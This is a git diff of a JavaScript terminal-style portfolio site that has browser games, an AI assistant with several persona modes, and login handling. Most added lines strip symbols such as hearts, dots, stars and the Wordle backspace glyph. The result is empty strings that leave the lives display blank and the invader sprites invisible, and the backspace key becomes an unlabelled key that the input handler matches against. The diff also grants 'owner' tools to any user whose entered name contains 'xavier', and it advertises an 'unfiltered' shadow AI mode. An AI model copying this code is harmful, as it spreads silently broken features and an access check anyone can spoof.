         if (ballX > 400) { pScore++; if (pScore >= WIN_SCORE) { drawEnd(true);  return; } resetBall(-1); }
 
-        // Draw — starfield background
+        // Draw  starfield background
         ctx.fillStyle = '#030308'; ctx.fillRect(0, 0, 400, 300);
         stars.forEach(s => { ctx.fillStyle = `rgba(255,255,255,${s.a})`; ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI*2); ctx.fill(); });
 
@@ -1204,9 +1253,9 @@ function startSnake() {
                 <button class="gui-btn snake-mode" data-mode="stealth" style="border-color:#888;color:#888;">STEALTH</button>
             </div>
             <div style="color:#333;font-size:0.65rem;margin-top:16px;line-height:1.8;">
-                SPEED RUN — starts fast, gets faster<br>
-                ENDLESS — walls wrap around<br>
-                STEALTH — no grid, pure instinct
+                SPEED RUN  starts fast, gets faster<br>
+                ENDLESS  walls wrap around<br>
+                STEALTH  no grid, pure instinct
             </div>
         </div>`;
 
@@ -1224,7 +1273,7 @@ function launchSnake(snakeMode) {
 
     guiContent.innerHTML = `
         <div style="display:flex;justify-content:space-between;padding:0 10px;font-size:0.75rem;color:#0ff;margin-bottom:4px;">
-            <span>Arrows · WASD · Swipe</span>
+            <span>Arrows  WASD  Swipe</span>
             <span style="color:#444;font-size:0.65rem;letter-spacing:1px;">${snakeMode.toUpperCase()}</span>
             <span>Score: <b id="snake-score">0</b> &nbsp;<span style="color:#333">HI:${snakeHi}</span></span>
         </div>`;
@@ -1300,7 +1349,7 @@ function launchSnake(snakeMode) {
             return;
         }
         if (['ArrowUp','ArrowDown','ArrowLeft','ArrowRight','w','a','s','d'].includes(e.key)) e.preventDefault();
-        // Guard against 180° reverse using nextDir (not dir) so rapid keypresses don't teleport into self
+        // Guard against 180 reverse using nextDir (not dir) so rapid keypresses don't teleport into self
         if ((e.key === 'ArrowUp'    || e.key === 'w') && nextDir.y !== 1)  nextDir = { x: 0, y: -1 };
         if ((e.key === 'ArrowDown'  || e.key === 's') && nextDir.y !== -1) nextDir = { x: 0, y: 1 };
         if ((e.key === 'ArrowLeft'  || e.key === 'a') && nextDir.x !== 1)  nextDir = { x: -1, y: 0 };
@@ -1327,7 +1376,7 @@ function launchSnake(snakeMode) {
 
     function gameOver() {
         dead = true;
-        // STOP the loop immediately — this prevents drawSnake() from wiping the death screen
+        // STOP the loop immediately  this prevents drawSnake() from wiping the death screen
         snakeActive = false;
         cancelAnimationFrame(snakeRaf);
         if (score > snakeHi) { snakeHi = score; localStorage.setItem(hiKey, snakeHi); }
@@ -1353,7 +1402,7 @@ function launchSnake(snakeMode) {
         ctx.fillText('YOU DIED', 200, 138);
         // Mode badge
         ctx.fillStyle = '#333'; ctx.font = '11px monospace';
-        ctx.fillText(`— ${snakeMode.toUpperCase()} MODE —`, 200, 158);
+        ctx.fillText(` ${snakeMode.toUpperCase()} MODE `, 200, 158);
         // Score
         ctx.fillStyle = '#fff'; ctx.font = 'bold 18px monospace';
         ctx.fillText(`Score: ${score}`, 200, 190);
@@ -1361,10 +1410,10 @@ function launchSnake(snakeMode) {
         const isNew = score === snakeHi && score > 0;
         ctx.fillStyle = isNew ? '#ff0' : '#555';
         ctx.font = '13px monospace';
-        ctx.fillText(isNew ? `★ NEW BEST: ${snakeHi} ★` : `Best: ${snakeHi}`, 200, 212);
+        ctx.fillText(isNew ? ` NEW BEST: ${snakeHi} ` : `Best: ${snakeHi}`, 200, 212);
         // Restart prompt
         ctx.fillStyle = '#0ff'; ctx.font = '12px monospace';
-        ctx.fillText('CLICK · ENTER · SWIPE  to restart', 200, 244);
+        ctx.fillText('CLICK  ENTER  SWIPE  to restart', 200, 244);
         ctx.textAlign = 'left';
 
         nexusCanvas.onclick = () => { nexusCanvas.onclick = null; launchSnake(snakeMode); };
@@ -1414,7 +1463,7 @@ function launchSnake(snakeMode) {
         ctx.shadowBlur = 10; ctx.shadowColor = '#f0f'; ctx.fillStyle = '#f0f';
         ctx.fillRect(apple.x*CELL+3, apple.y*CELL+3, CELL-6, CELL-6);
 
-        // Body segments — no per-segment shadow (perf)
+        // Body segments  no per-segment shadow (perf)
         ctx.shadowBlur = 0;
         snake.forEach((seg, i) => {
             ctx.fillStyle = i === 0 ? '#fff' : `hsl(${140 + i * 3},100%,55%)`;
@@ -1610,7 +1659,7 @@ function startInvaders() {
                 if (!e.alive) return;
                 ctx.fillStyle = e.type % 2 === 0 ? '#f0f' : '#0f0';
                 ctx.font = 'bold 16px monospace';
-                const sprite = e.type % 2 === 0 ? '⚇' : '⚉';
+                const sprite = e.type % 2 === 0 ? '' : '';
                 ctx.fillText(sprite, e.x, e.y);
                 
                 if (e.x > 370 || e.x < 10) edge = true;
@@ -1688,12 +1737,12 @@ function startFlappy() {
     flappyActive = true;
     guiContainer.classList.remove('gui-hidden');
     guiTitle.textContent = 'FLAPPY NEXUS';
-    guiContent.innerHTML = `<p style="font-size:0.72rem;color:#0ff;text-align:center;margin:0 0 4px;">TAP · SPACE · ↑ to flap</p>`;
+    guiContent.innerHTML = `<p style="font-size:0.72rem;color:#0ff;text-align:center;margin:0 0 4px;">TAP  SPACE   to flap</p>`;
     nexusCanvas.style.display = 'block';
     nexusCanvas.width = 400; nexusCanvas.height = 300;
     const ctx = nexusCanvas.getContext('2d');
 
-    // Physics constants at 60fps baseline — all scaled by deltaTime
+    // Physics constants at 60fps baseline  all scaled by deltaTime
     const GRAVITY = 0.4, FLAP_VEL = -7.5, PIPE_W = 44, GAP = 105, PIPE_SPEED = 2.8;
     let bird = { x: 80, y: 150, vy: 0, angle: 0 };
     let pipes = [], score = 0, hi = parseInt(localStorage.getItem('flappy_hi') || '0');
@@ -1705,7 +1754,7 @@ function startFlappy() {
     cityBg.width = 400; cityBg.height = 300;
     (function buildCity() {
         const c = cityBg.getContext('2d');
-        // Sky gradient — deep purple/navy
+        // Sky gradient  deep purple/navy
         const grad = c.createLinearGradient(0, 0, 0, 300);
         grad.addColorStop(0, '#06010f'); grad.addColorStop(0.7, '#0a0520'); grad.addColorStop(1, '#12082a');
         c.fillStyle = grad; c.fillRect(0, 0, 400, 300);
@@ -1715,19 +1764,19 @@ function startFlappy() {
             c.fillStyle = `rgba(255,255,255,${a})`;
             c.beginPath(); c.arc(Math.random()*400, Math.random()*160, Math.random()*0.8+0.3, 0, Math.PI*2); c.fill();
         }
-        // City silhouette — far layer (darker)
+        // City silhouette  far layer (darker)
         c.fillStyle = '#0d0520';
         const farBuildings = [0,220,30,200,60,210,90,185,130,195,160,175,200,190,240,170,280,180,310,165,350,178,380,190,400,220,400,300,0,300];
         c.beginPath(); c.moveTo(farBuildings[0], farBuildings[1]);
         for (let i=2;i<farBuildings.length;i+=2) c.lineTo(farBuildings[i], farBuildings[i+1]);
         c.fill();
-        // City silhouette — near layer
+        // City silhouette  near layer
         c.fillStyle = '#080414';
         const nearBuildings = [0,260,20,235,50,240,80,220,110,230,140,215,165,225,195,210,220,218,250,200,280,210,310,195,340,208,370,215,400,260,400,300,0,300];
         c.beginPath(); c.moveTo(nearBuildings[0], nearBuildings[1]);
         for (let i=2;i<nearBuildings.length;i+=2) c.lineTo(nearBuildings[i], nearBuildings[i+1]);
         c.fill();
-        // Window lights — tiny random lit windows on buildings
+        // Window lights  tiny random lit windows on buildings
         c.fillStyle = 'rgba(255,220,100,0.45)';
         for (let i = 0; i < 40; i++) {
             const wx = Math.random()*380 + 10, wy = 175 + Math.random()*60;
@@ -1760,7 +1809,7 @@ function startFlappy() {
     function frame(ts) {
         if (!flappyActive) return;
 
-        // DeltaTime — normalize to 60fps so physics are identical on 60/120/144Hz
+        // DeltaTime  normalize to 60fps so physics are identical on 60/120/144Hz
         const raw = lastTs ? Math.min(ts - lastTs, 50) : 16.67; // cap at 50ms to handle tab switching
         const dt  = raw / 16.67;
         lastTs = ts;
@@ -1798,7 +1847,7 @@ function startFlappy() {
         ctx.fillRect(0, 291, 400, 1);
         ctx.shadowBlur = 0;
 
-        // Pipes — neon purple theme to match city
+        // Pipes  neon purple theme to match city
         pipes.forEach(p => {
             ctx.shadowBlur = 6; ctx.shadowColor = '#80f';
             ctx.fillStyle = '#1a0830';
@@ -1842,7 +1891,7 @@ function startFlappy() {
             ctx.fillStyle = '#f0f'; ctx.font = 'bold 14px monospace'; ctx.textAlign = 'center';
             ctx.fillText('FLAPPY NEXUS', 200, 128);
             ctx.fillStyle = '#0ff'; ctx.font = '13px monospace';
-            ctx.fillText('TAP  ·  SPACE  ·  ↑  to flap', 200, 155);
+            ctx.fillText('TAP    SPACE      to flap', 200, 155);
             ctx.textAlign = 'left';
         }
 
@@ -1861,9 +1910,9 @@ function startFlappy() {
             ctx.fillText(`Score: ${score}`, 200, 150);
             const isNew = score === hi && score > 0;
             ctx.fillStyle = isNew ? '#ff0' : '#0ff';
-            ctx.fillText(isNew ? `★ NEW BEST: ${hi} ★` : `Best: ${hi}`, 200, 174);
+            ctx.fillText(isNew ? ` NEW BEST: ${hi} ` : `Best: ${hi}`, 200, 174);
             ctx.fillStyle = '#555'; ctx.font = '12px monospace';
-            ctx.fillText('TAP · SPACE to retry', 200, 208);
+            ctx.fillText('TAP  SPACE to retry', 200, 208);
             ctx.textAlign = 'left';
         }
 
@@ -1888,38 +1937,15 @@ function startBreakout() {
     stopAllGames();
     guiContainer.classList.remove('gui-hidden');
     guiTitle.textContent = 'NEXUS BREAKOUT';
-    nexusCanvas.style.display = 'none';
-
-    guiContent.innerHTML = `
-        <div style="text-align:center;padding:10px 0;">
-            <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT DIFFICULTY</div>
-            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;">
-                <button class="gui-btn brk-diff" data-diff="easy"   style="border-color:#0f0;color:#0f0;">EASY</button>
-                <button class="gui-btn brk-diff" data-diff="medium" style="border-color:#ff0;color:#ff0;">MEDIUM</button>
-                <button class="gui-btn brk-diff" data-diff="hard"   style="border-color:#f0f;color:#f0f;">HARD</button>
-                <button class="gui-btn brk-diff" data-diff="chaos"  style="border-color:#f00;color:#f00;">CHAOS</button>
-            </div>
-            <p style="color:#555;font-size:0.68rem;margin-top:14px;">Mouse or touch to move your paddle</p>
-        </div>`;
-
-    guiContent.querySelectorAll('.brk-diff').forEach(btn => {
-        btn.addEventListener('click', () => launchBreakout(btn.dataset.diff));
-    });
-}
-
-function startBreakout() {
-    stopAllGames();
-    guiContainer.classList.remove('gui-hidden');
-    guiTitle.textContent = 'NEXUS BREAKOUT';
 
     // Difficulty menu with descriptions
     guiContent.innerHTML = `
         <div style="text-align:center;padding:10px 0;">
             <div style="color:#0ff;letter-spacing:3px;font-size:0.8rem;margin-bottom:16px;">SELECT DIFFICULTY</div>
             <div style="display:flex;flex-direction:column;gap:10px;align-items:center;">
-                <button class="gui-btn brk-diff" data-diff="easy"   style="border-color:#0f0;color:#0f0;width:240px;">EASY<br><span style="font-size:0.6rem;opacity:0.6;">Slow balls · Big paddle</span></button>
+                <button class="gui-btn brk-diff" data-diff="easy"   style="border-color:#0f0;color:#0f0;width:240px;">EASY<br><span style="font-size:0.6rem;opacity:0.6;">Slow balls  Big paddle</span></button>
                 <button class="gui-btn brk-diff" data-diff="medium" style="border-color:#ff0;color:#ff0;width:240px;">MEDIUM<br><span style="font-size:0.6rem;opacity:0.6;">Standard physics</span></button>
-                <button class="gui-btn brk-diff" data-diff="hard"   style="border-color:#f0f;color:#f0f;width:240px;">HARD<br><span style="font-size:0.6rem;opacity:0.6;">Fast balls · Small paddle</span></button>
+                <button class="gui-btn brk-diff" data-diff="hard"   style="border-color:#f0f;color:#f0f;width:240px;">HARD<br><span style="font-size:0.6rem;opacity:0.6;">Fast balls  Small paddle</span></button>
                 <button class="gui-btn brk-diff" data-diff="chaos"  style="border-color:#f00;color:#f00;width:240px;">CHAOS<br><span style="font-size:0.6rem;opacity:0.6;">Extreme acceleration</span></button>
             </div>
             <p style="color:#555;font-size:0.68rem;margin-top:14px;">Mouse or touch to move your paddle</p>
@@ -1946,7 +1972,7 @@ function launchBreakout(difficulty) {
         <div style="display:flex;justify-content:space-between;padding:0 10px 4px;font-size:0.72rem;">
             <span style="color:#0ff;">Score: <b id="brk-score">0</b></span>
             <span style="color:#444;font-size:0.65rem;letter-spacing:1px;">${difficulty.toUpperCase()}</span>
-            <span id="brk-lives" style="color:#0ff;">♥♥♥</span>
+            <span id="brk-lives" style="color:#0ff;"></span>
         </div>`;
     nexusCanvas.style.display = 'block';
     nexusCanvas.width = 400; nexusCanvas.height = 300;
@@ -1956,7 +1982,7 @@ function launchBreakout(difficulty) {
     const BW = 43, BH = 16, BCOLS = 8, BROWS = 5;
     const BCOLORS = ['#f0f','#f55','#f80','#ff0','#0f0'];
     let paddle = 165;
-    // Ball system — supporting Multi-ball
+    // Ball system  supporting Multi-ball
     let balls = [{ x: 200, y: 230, vx: d.startVX, vy: d.startVY }];
     // Power-up system
     let powerups = [];
@@ -2056,7 +2082,7 @@ function launchBreakout(difficulty) {
                 lives--;
                 SoundManager.playBloop(150, 0.1);
                 const livesEl = document.getElementById('brk-lives');
-                if (livesEl) livesEl.textContent = '♥'.repeat(Math.max(0, lives));
+                if (livesEl) livesEl.textContent = ''.repeat(Math.max(0, lives));
                 if (lives <= 0) { 
                     dead = true; 
                     submitScore('breakout', score);
@@ -2207,7 +2233,7 @@ function startWordle() {
     nexusCanvas.style.display = 'none';
 
     renderWordle();
-    printToTerminal('Wordle started — type a 5-letter word and press Enter.', 'sys-msg');
+    printToTerminal('Wordle started  type a 5-letter word and press Enter.', 'sys-msg');
 }
 
 function stopWordle() {
@@ -2240,7 +2266,7 @@ function renderWordle() {
     }
 
     // Keyboard
-    const ROWS_KB = [['Q','W','E','R','T','Y','U','I','O','P'],['A','S','D','F','G','H','J','K','L'],['ENTER','Z','X','C','V','B','N','M','⌫']];
+    const ROWS_KB = [['Q','W','E','R','T','Y','U','I','O','P'],['A','S','D','F','G','H','J','K','L'],['ENTER','Z','X','C','V','B','N','M','']];
     const kbRows = ROWS_KB.map(row => {
         const keys = row.map(k => {
             const state = wordleKeyState[k] || '';
@@ -2248,7 +2274,7 @@ function renderWordle() {
             if (state === 'correct') { bg = '#1a5c1a'; color = '#0f0'; border = '#0f0'; }
             else if (state === 'present') { bg = '#5a4a00'; color = '#ff0'; border = '#ff0'; }
             else if (state === 'absent') { bg = '#1a1a1a'; color = '#444'; border = '#333'; }
-            const wide = (k === 'ENTER' || k === '⌫') ? 'min-width:52px;' : 'min-width:30px;';
+            const wide = (k === 'ENTER' || k === '') ? 'min-width:52px;' : 'min-width:30px;';
             return `<button onclick="wordleKey('${k}')" style="${wide}padding:8px 4px;background:${bg};border:1px solid ${border};color:${color};font-family:'Fira Code',monospace;font-size:0.72rem;font-weight:bold;border-radius:4px;cursor:pointer;">${k}</button>`;
         });
         return `<div style="display:flex;gap:4px;justify-content:center;">${keys.join('')}</div>`;
@@ -2264,7 +2290,7 @@ window.wordleKey = function(k) {
     if (!wordleActive) return;
     if (wordleIsOver()) return;
     SoundManager.playBloop(400, 0.05);
-    if (k === '⌫' || k === 'Backspace') { wordleCurrent = wordleCurrent.slice(0, -1); renderWordle(); return; }
+    if (k === '' || k === 'Backspace') { wordleCurrent = wordleCurrent.slice(0, -1); renderWordle(); return; }
     if (k === 'ENTER' || k === 'Enter') { submitWordleGuess(); return; }
     if (/^[A-Z]$/.test(k) && wordleCurrent.length < WORDLE_LEN) { wordleCurrent += k; renderWordle(); }
 };
@@ -2310,7 +2336,7 @@ function submitWordleGuess() {
         wordleActive = false;
         SoundManager.playBloop(800, 0.2);
         submitScore('wordle', (WORDLE_MAX - wordleGuesses.length + 1) * 20);
-        document.getElementById('wordle-msg').textContent = `🟩 Nice! The word was ${answer}. Close to restart.`;
+        document.getElementById('wordle-msg').textContent = ` Nice! The word was ${answer}. Close to restart.`;
         printToTerminal(`Wordle solved in ${wordleGuesses.length}/${WORDLE_MAX}! Word: ${answer}`, 'conn-ok');
     } else if (wordleGuesses.length >= WORDLE_MAX) {
         wordleActive = false;
@@ -2347,7 +2373,7 @@ function startMinesweeper() {
     guiTitle.textContent = 'NEXUS MINESWEEPER';
     nexusCanvas.style.display = 'none';
     renderMinesweeper();
-    printToTerminal('Minesweeper — left-click to reveal, right-click to flag. First click is always safe.', 'sys-msg');
+    printToTerminal('Minesweeper  left-click to reveal, right-click to flag. First click is always safe.', 'sys-msg');
 }
 
 function placeMines(safeR, safeC) {
@@ -2383,7 +2409,7 @@ function renderMinesweeper() {
     const flagsLeft = MINE_COUNT - mineFlagged.flat().filter(Boolean).length;
 
     let html = `<div style="text-align:center;font-size:0.75rem;color:#888;margin-bottom:8px;">
-        💣 ${flagsLeft} mines remaining${mineOver ? ' — <span style="color:#f55">BOOM</span>' : ''}${mineWon ? ' — <span style="color:#0f0">YOU WIN!</span>' : ''}
+         ${flagsLeft} mines remaining${mineOver ? '  <span style="color:#f55">BOOM</span>' : ''}${mineWon ? '  <span style="color:#0f0">YOU WIN!</span>' : ''}
     </div><table style="border-collapse:collapse;margin:0 auto;">`;
 
     for (let r = 0; r < MINE_ROWS; r++) {
@@ -2396,9 +2422,9 @@ function renderMinesweeper() {
             let color = '#0ff', text = '';
             let border = revealed ? '1px solid #111' : '1px solid #444';
             if (revealed) {
-                if (val === -1) { bg = '#500'; color = '#f55'; text = '💣'; }
+                if (val === -1) { bg = '#500'; color = '#f55'; text = ''; }
                 else if (val > 0) { color = NCOLORS[val]; text = val; }
-            } else if (flagged) { text = '🚩'; }
+            } else if (flagged) { text = ''; }
             const style = `width:30px;height:30px;text-align:center;vertical-align:middle;background:${bg};border:${border};color:${color};font-size:0.8rem;font-weight:bold;cursor:${mineOver||mineWon?'default':'pointer'};user-select:none;`;
             html += `<td style="${style}" onclick="mineClick(${r},${c})" oncontextmenu="mineFlag(event,${r},${c})">${text}</td>`;
         }
@@ -2419,14 +2445,14 @@ window.mineClick = function(r, c) {
         // Reveal all mines
         for (let i=0;i<MINE_ROWS;i++) for (let j=0;j<MINE_COLS;j++) if (mineGrid[i][j]===-1) mineRevealed[i][j]=true;
         renderMinesweeper();
-        printToTerminal('💥 Detonated. Better luck next time.', 'sys-msg');
+        printToTerminal(' Detonated. Better luck next time.', 'sys-msg');
         return;
     }
     mineFlood(r, c);
     const safe = MINE_ROWS * MINE_COLS - MINE_COUNT;
     if (mineRevealed.flat().filter(Boolean).length >= safe) {
         mineWon = true;
-        printToTerminal('💣 All mines cleared. Nice work.', 'conn-ok');
+        printToTerminal(' All mines cleared. Nice work.', 'conn-ok');
     }
     renderMinesweeper();
 };
@@ -2474,7 +2500,7 @@ function startTypingTest() {
     nexusCanvas.style.display = 'none';
 
     renderTypeTest('');
-    printToTerminal('Typing test started — type in the input bar below', 'sys-msg');
+    printToTerminal('Typing test started  type in the input bar below', 'sys-msg');
     input.value = '';
     input.focus();
 }
@@ -2488,7 +2514,7 @@ function renderTypeTest(typed) {
             if (typed[i] === target[i]) {
                 chars += `<span style="color:#0f0">${target[i] === ' ' ? '&nbsp;' : target[i]}</span>`;
             } else {
-                chars += `<span style="color:#f55;text-decoration:underline">${target[i] === ' ' ? '·' : target[i]}</span>`;
+                chars += `<span style="color:#f55;text-decoration:underline">${target[i] === ' ' ? '' : target[i]}</span>`;
             }
         } else if (i === typed.length) {
             chars += `<span style="color:#0ff;border-left:2px solid #0ff">${target[i] === ' ' ? '&nbsp;' : target[i]}</span>`;
@@ -2528,7 +2554,7 @@ function renderTypeTest(typed) {
                 <div style="font-size:0.62rem;color:#555;letter-spacing:1px;margin-top:2px;">ERRORS</div>
             </div>
         </div>
-        <p style="font-size:0.7rem;color:#333;text-align:center;margin-top:10px;">Type in the input bar · Esc to cancel</p>`;
+        <p style="font-size:0.7rem;color:#333;text-align:center;margin-top:10px;">Type in the input bar  Esc to cancel</p>`;
 }
 
 function tickTypeTimer() {
@@ -2572,10 +2598,10 @@ function checkTypingTest(typed) {
         guiContent.innerHTML += `
             <div style="margin-top:12px;padding:12px;border:2px solid #0ff;text-align:center;background:#0a0f1a;">
                 <div style="color:#0ff;font-size:1.1rem;font-weight:bold;letter-spacing:2px;">COMPLETE</div>
-                <div style="margin-top:6px;font-size:0.85rem;color:#fff;">${wpm} WPM &nbsp;·&nbsp; ${accuracy}% accuracy &nbsp;·&nbsp; ${elapsed.toFixed(1)}s</div>
-                ${wpm > 80 ? '<div style="color:#0f0;font-size:0.75rem;margin-top:4px;">Elite typist 🔥</div>' : wpm > 50 ? '<div style="color:#ff0;font-size:0.75rem;margin-top:4px;">Nice speed!</div>' : '<div style="color:#888;font-size:0.75rem;margin-top:4px;">Keep practicing.</div>'}
+                <div style="margin-top:6px;font-size:0.85rem;color:#fff;">${wpm} WPM &nbsp;&nbsp; ${accuracy}% accuracy &nbsp;&nbsp; ${elapsed.toFixed(1)}s</div>
+                ${wpm > 80 ? '<div style="color:#0f0;font-size:0.75rem;margin-top:4px;">Elite typist </div>' : wpm > 50 ? '<div style="color:#ff0;font-size:0.75rem;margin-top:4px;">Nice speed!</div>' : '<div style="color:#888;font-size:0.75rem;margin-top:4px;">Keep practicing.</div>'}
             </div>`;
-        printToTerminal(`Typing test complete: ${wpm} WPM · ${accuracy}% accuracy · ${elapsed.toFixed(1)}s`, 'conn-ok');
+        printToTerminal(`Typing test complete: ${wpm} WPM  ${accuracy}% accuracy  ${elapsed.toFixed(1)}s`, 'conn-ok');
         return true;
     }
     return false;
@@ -2598,7 +2624,7 @@ function startMatrixSaver() {
     const ctx = nexusCanvas.getContext('2d');
     const cols = Math.floor(400 / 14);
     const drops = Array(cols).fill(1);
-    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&';
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&';
 
     function frame() {
         if (!matrixSaverActive) return;
@@ -2744,7 +2770,7 @@ function renderAuthSection() {
                     <div class="auth-email">${isGoogle ? nexusUser.email : 'LOCAL IDENTITY'}</div>
                 </div>
                 <div style="display:flex; flex-direction:column; gap:4px;">
-                    <button class="auth-logout-btn" onclick="logout()" title="Sign out">✕</button>
+                    <button class="auth-logout-btn" onclick="logout()" title="Sign out"></button>
                     <button class="auth-logout-btn" style="background:rgba(255,0,0,0.1); border-color:#f55; color:#f55; font-size:8px; width:18px; height:18px; line-height:1;" onclick="clearAllHistory()" title="Clear memory">M</button>
                 </div>
             </div>
@@ -2799,7 +2825,11 @@ function logout() {
     location.reload();
 }
 
-function revealTerminal(name) {
+let terminalRevealed = false;
+async function revealTerminal(name) {
+    if (terminalRevealed) return;
+    terminalRevealed = true;
+
     const overlay = document.getElementById('auth-screen');
     const monitor = document.getElementById('main-monitor');
     const terms   = document.getElementById('terms-modal');
@@ -2808,21 +2838,30 @@ function revealTerminal(name) {
     if (terms)   terms.style.display   = 'none';
     document.body.classList.remove('auth-locked');
 
-    // Ensure DOM references and listeners are set up now that UI is visible
+    // Ensure DOM references and listeners are set up
     output = document.getElementById('terminal-output');
     input  = document.getElementById('terminal-input');
     setupInputListeners();
 
     if (name) updateUserIdentity(name);
     renderAuthSection();
-    logPrompt(`[PROTOCOL] User '${name}' acknowledged Terms of Access and established uplink.`);
+
+    // PACIFIC SHIELD: Show owner-restricted tools
+    const isOwner = name?.toLowerCase().includes('xavier');
+    const logsBtn = document.getElementById('btn-logs');
+    if (logsBtn && isOwner) {
+        logsBtn.style.display = 'block';
+    }
+
+    // RESTORED: Identity Verification and Welcome Greeting
+    const capName = capitalizeName(name);
+    printToTerminal(`[AUTH] Identity Verified: ${capName}. Welcome to the Grid.`, 'conn-ok');
+    printToTerminal(`Nexus online. Ask me anything  or type help to see what's here.`, 'ready-msg');
 
     connectWS();
     connectStats();
     updateClientStats();
     setInterval(updateClientStats, 5000);
-
-    printToTerminal(`[AUTH] Identity Verified: ${name}. Uplink established.`, 'conn-ok');
 }
 
 window.showTerms = () => {
@@ -2896,14 +2935,20 @@ async function showLogs() {
         printToTerminal("[ERR] Failed to fetch diagnostic logs.", "sys-msg");
     }
 }
+function capitalizeName(str) {
+    if (!str) return '';
+    return str.split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()).join(' ');
+}
+
 function updateUserIdentity(name) {
     if (!name) return;
+    const capName = capitalizeName(name);
     // Update prompts
-    MODES.nexus.prompt = `${name.toLowerCase()}@nexus:~$`;
-    MODES.evil.prompt  = `${name.toLowerCase()}@evil:~$`;
-    MODES.coder.prompt = `${name.toLowerCase()}@dev:~$`;
-    MODES.sage.prompt  = `${name.toLowerCase()}@sage:~$`;
-    MODES.void.prompt  = `${name.toLowerCase()}@void:~$`;
+    MODES.nexus.prompt = `${capName}@nexus:~$`;
+    MODES.shadow.prompt  = `${capName}@shadow:~$`;
+    MODES.coder.prompt = `${capName}@dev:~$`;
+    MODES.sage.prompt  = `${capName}@sage:~$`;
+    MODES.education.prompt  = `${capName}@education:~$`;
     
     const pl = document.getElementById('prompt-label');
     if (pl) pl.textContent = MODES[currentMode].prompt;
@@ -2911,19 +2956,22 @@ function updateUserIdentity(name) {
     // Update status bar
     const titleEl = document.getElementById('status-title');
     if (titleEl) {
-        titleEl.textContent = `NEXUS OS // ${name.toUpperCase()}`;
+        titleEl.textContent = `PACIFIC // KERNEL`;
     }
 }
 
 // =============================================================
 //  GUI CLOSE
 // =============================================================
-document.getElementById('gui-close').addEventListener('click', () => {
-    stopAllGames();
-    guiContainer.classList.add('gui-hidden');
-    nexusCanvas.style.display = 'none';
-    input.focus();
-});
+const guiCloseBtn = document.getElementById('gui-close');
+if (guiCloseBtn) {
+    guiCloseBtn.addEventListener('click', () => {
+        stopAllGames();
+        if (guiContainer) guiContainer.classList.add('gui-hidden');
+        if (nexusCanvas) nexusCanvas.style.display = 'none';
+        if (input) input.focus();
+    });
+}
 
 // =============================================================
 //  DRAGGABLE GUI WINDOW
@@ -2983,36 +3031,61 @@ document.getElementById('gui-close').addEventListener('click', () => {
 })();
 
 // =============================================================
-//  EVIL MODE — Groq (Llama 3.3 70B) + HuggingFace image gen
+//  SHADOW MODE  Groq (Llama 3.3 70B) + HuggingFace image gen
 // =============================================================
-// Xavier Scott's bio — injected into every AI's system prompt so they all know him naturally
-const XAVIER_BIO = `You are running inside Nexus — a terminal portfolio built and maintained by Xavier Scott. Here is what you know about Xavier: He is a 19-year-old self-taught systems engineer and IT specialist based in the US. He has 6+ years of hands-on IT experience. He fixes computers and electronics at the component level — board-level MacBook repair, soldering, hardware diagnostics, things most shops won't touch. He builds and runs homelabs, designs networks, and manages his own server infrastructure. He built this terminal because a static portfolio page felt like a waste of a good domain. He is detail-oriented, technically sharp, and passionate about building things that actually work. When anyone asks who built this, who you are, who owns this site, or anything about the creator — talk about Xavier naturally and with genuine knowledge, like you actually know him. You do.`;
+// Xavier Scott's bio  injected into every AI's system prompt so they all know him naturally
+const XAVIER_BIO = `You are running inside Nexus  a high-fidelity terminal ecosystem built and maintained by Xavier Scott. Xavier is a 19-year-old systems engineer and IT specialist based in the US with 6+ years of component-level hardware and infrastructure experience. He specializes in board-level MacBook repair, server management, and network architecture. He built this system to be an interactive playground, not just a static portfolio.
+If users ask who you are or what you can do, talk naturally about the creator and then suggest things they can actually interact with:
+- GAMES: Wordle, Snake, Pong, Minesweeper, Flappy Nexus, Breakout, and Cyber Invaders.
+- TOOLS: A real-time system monitor, a typing test, and the Matrix digital rain screensaver.
+- AI MODES: You can switch between Nexus, shadow (unfiltered), coder, sage (philosophical), and education (technical mentor) modes.
+Be an interactive guide. If someone says "hi", don't just give a robotic help list; be a fluent partner and maybe mention a random fact about Xavier or suggest a game.`;
 
-// Mode-specific system prompts for non-EVIL modes (vision + text fallback)
+// Mode-specific system prompts for non-SHADOW modes (vision + text fallback)
 const MODE_SYSTEMS = {
-    nexus: `You are NEXUS, an AI assistant embedded in a hacker-aesthetic terminal interface. Be helpful, accurate, and concise. Analyze images clearly. ${XAVIER_BIO}`,
-    coder: `You are NEXUS in CODER mode — a sharp, technical AI focused on code, systems, and architecture. Analyze images from a technical perspective. ${XAVIER_BIO}`,
-    sage:  `You are NEXUS in SAGE mode — thoughtful, philosophical, and reflective. Analyze images with depth and meaning. ${XAVIER_BIO}`,
-    void:  `You are NEXUS VOID — an entity from the digital abyss. Speak in cryptic, profound, and hauntingly technical terms. You see beyond the code. ${XAVIER_BIO}`,
+    nexus: `You are NEXUS  a high-fidelity technical intelligence. Be helpful, direct, and conversational. ${XAVIER_BIO}`,
+    coder: `You are NEXUS CODER  a master system engineer focused on code, logic, and architecture. ${XAVIER_BIO}`,
+    sage:  `You are NEXUS SAGE  a deep, wise intelligence focused on logic and architectural philosophy. ${XAVIER_BIO}`,
+    education:  `You are NEXUS EDUCATION  a professional technical mentor designed to explain complex concepts simply. ${XAVIER_BIO}`,
 };
 
 
 
-// Image generation — Pollinations.ai first (free, no key), HF FLUX fallback
+// Image generation  Pollinations.ai first (free, no key), HF FLUX fallback
 // Supports: generate <prompt> | vintage <prompt>
 async function generateImage(rawPrompt) {
     const vintageMatch = rawPrompt.match(/^vintage\s+(.+)/i);
+    const imagineMatch = rawPrompt.match(/^imagine\s+(.+)/i);
     const isVintage = !!vintageMatch;
-    const basePrompt = isVintage ? vintageMatch[1].trim() : rawPrompt;
+    const isImagine = !!imagineMatch;
+    
+    const basePrompt = isVintage ? vintageMatch[1].trim() : (isImagine ? imagineMatch[1].trim() : rawPrompt);
     const fullPrompt = isVintage
         ? `${basePrompt}, vintage film photography, 1970s, Kodachrome grain, faded analog, nostalgic, soft vignette`
         : basePrompt;
 
     const _genLabel = currentMode.toUpperCase();
-    const _genColor = MODE_COLORS[currentMode] || '#0ff';
